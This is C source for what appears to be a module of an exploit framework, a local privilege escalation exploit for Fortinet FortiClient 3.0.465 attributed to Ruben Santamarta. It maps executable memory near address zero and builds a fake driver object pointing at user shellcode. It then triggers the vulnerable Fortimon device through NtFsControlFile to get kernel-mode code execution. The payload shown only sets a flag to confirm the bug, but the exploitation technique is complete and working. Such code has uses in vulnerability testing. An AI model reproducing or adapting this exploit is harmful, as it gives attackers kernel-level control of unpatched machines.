

#include "stdafx.h"

#define IRP_MJ_SYSTEM_CONTROL                    0x0D


//// typedef stuff

typedef NTSTATUS (WINAPI *PNTALLOCATE)(	IN HANDLE               ProcessHandle,
										IN OUT PVOID            *BaseAddress,
										IN ULONG                ZeroBits,
										IN OUT PULONG           RegionSize,
										IN ULONG                AllocationType,
										IN ULONG                Protect );



typedef NTSTATUS (WINAPI *PFSCONTROL) (	HANDLE           handle,
										HANDLE           event,
										PVOID			 apc,
										PVOID            apc_context,
										PVOID			 io,
										ULONG            code,
										PVOID            in_buffer,
										ULONG            in_size,
										PVOID            out_buffer,
										ULONG            out_size
										);
	//// Native API
 PNTALLOCATE        NtAllocateVirtualMemory;
 PFSCONTROL			NtFsControlFile;

 
 
 BOOL FlagVulnerable = FALSE;

_declspec(naked) void ShellCode()
{
	_asm{
		mov FlagVulnerable,1
		retn 0x8
	}
}


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}


 int Callback_Overview()
{
	printf("\n");
	printf("=================================================	\n");
	printf("	:: Fortinet FortiClient 3.0.465 ::		\n");
	printf("            Local Privilege Escalation	\n");
	printf("=================================================	\n");
	printf("  Ruben Santamarta \n");
	printf("+ References:\n");
	printf("  www.reversemode.com\n\n");
	printf("-------------------------------------------------\n\n");
	return 1;
}

int Callback_Direct( char *lpInitStr )
{
	LPVOID			pKern=NULL, addr = (LPVOID)3;
	HANDLE			hDevice;
	HMODULE			hNTdll;
	DWORD			dwShellSize=0x1000;
	BOOL			bVulnerable = FALSE;
	DRIVER_OBJECT	drvObj = {0};
	
	int				status = 0;
	
	Callback_Overview();

	///// Dinamyc stuff

	hNTdll = GetModuleHandle( "ntdll.dll" );
 
	printf("\t + NtAllocateVirtualMemory");
	NtAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(hNTdll,"NtAllocateVirtualMemory");
	
	if( !NtAllocateVirtualMemory ) 
		return 0;
	printf( "\t\t [ 0x%p ]\n",NtAllocateVirtualMemory );

	printf("\t + NtFsControlFile");
	NtFsControlFile = (PFSCONTROL) GetProcAddress(hNTdll,"NtFsControlFile");
	
	if( !NtFsControlFile ) 
		return 0;
	printf( "\t\t\t [ 0x%p ]\n",NtFsControlFile );



	printf("\n[+] Allocating memory at [ 0x%p ]...",NULL);

	status = NtAllocateVirtualMemory(	INVALID_HANDLE_VALUE, 
										&addr, 
										0,
										&dwShellSize,
										MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, 
										PAGE_EXECUTE_READWRITE );

	if( (ULONG_PTR)addr )
	{
		printf("[*] Error allocating memory\n");
		return 0;
	}
	printf("OK\n");
	printf("[+] Setting up fake DriverObject ...");
	
	*(ULONG_PTR*)((ULONG_PTR)addr + sizeof(ULONG_PTR)*2 ) = (ULONG_PTR)&drvObj;

	drvObj.MajorFunction[IRP_MJ_SYSTEM_CONTROL] = ShellCode;
	printf("OK\n");
	
	printf("[+] Opening vulnerable device \"\\\\.\\Fortimon\"...");
	
	hDevice = OpenDevice( L"\\\\.\\Fortimon",
							TRUE,
							TRUE,
							FALSE,
							0,
							0);
	if( hDevice == INVALID_HANDLE_VALUE ) 
	{
		printf("\n[**] Vulnerable device not found\n");
		return FALSE;
	}
	printf("OK\n");
	printf("[+] Triggering ShellCode in 5 seconds...");
	Sleep(5000);
	
	NtFsControlFile(hDevice,
					NULL,
					NULL,
					NULL,
					NULL,
					0xBADCAFE,
					NULL,
					NULL,
					NULL,
					NULL);


	if( FlagVulnerable ) 
	{
		printf("OK");
		printf("\n\n[+] :: Exploit successfully completed\n");
	}
	else
	{
		printf("FAILED");
		printf("\n\n[+] :: Nothing found\n");
	}
	return status;
}